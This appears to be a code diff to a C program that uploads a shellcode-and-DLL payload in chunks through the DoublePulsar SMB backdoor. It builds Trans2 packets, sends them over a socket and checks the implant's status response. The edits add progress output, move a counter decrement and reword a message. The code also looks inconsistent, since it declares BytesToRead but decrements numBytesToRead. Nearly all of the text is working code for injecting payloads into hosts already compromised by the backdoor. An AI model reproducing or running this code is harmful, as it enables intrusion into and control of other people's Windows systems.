@@ -264,6 +264,7 @@ int main(int argc, char* argv[])
 	int encrypted_buffer_len;
 	encrypted_buffer_len = sizeof(encrypted);
 	int BytesToRead = sizeof(encrypted);
+	printf("Uploading file...%d bytes to send\n", BytesToRead);
 	for (ctx = 0; ctx < encrypted_buffer_len; ctx += BUFLEN)
 	{
 		memcpy(big_packet, trans2_request, sizeof(trans2_request));
@@ -296,20 +297,18 @@ int main(int argc, char* argv[])
 		//send the payload(shellcode + dll) in chunk of 0x1000(4096) bytes to backdoor.
 		send(sock, (char*)big_packet, sizeof(big_packet) - 1, 0);
 		recv(sock, (char*)recvbuff, sizeof(recvbuff), 0);
-
+		//subtract BytesToRead by how much we sent
+		numBytesToRead -= 4064;
 		//compare the NT_STATUS response to 0xC0000002 ( STATUS_NOT_IMPLEMENTED )
 		if (recvbuff[9] == 0x02 && recvbuff[10] == 0x00 && recvbuff[11] == 0x00 && recvbuff[12] == 0xc0)
 		{
-			printf("Data sent and got good response!\n");
+			printf("Data sent and got good response from DoublePulsar!\n");
 		}
 		else {
 			printf("Not good!  Doesn't seem to be working!  DoublePulsar error! Exiting!\n");
 			goto cleanup;
 		}
-		
-		//subtract BytesToRead by how much we sent
-		numBytesToRead -= 4064;
-		
+	
 		//increment CTX pointer by 1, so the correct bytes next loop will be copied
 		ctx++;
 	}
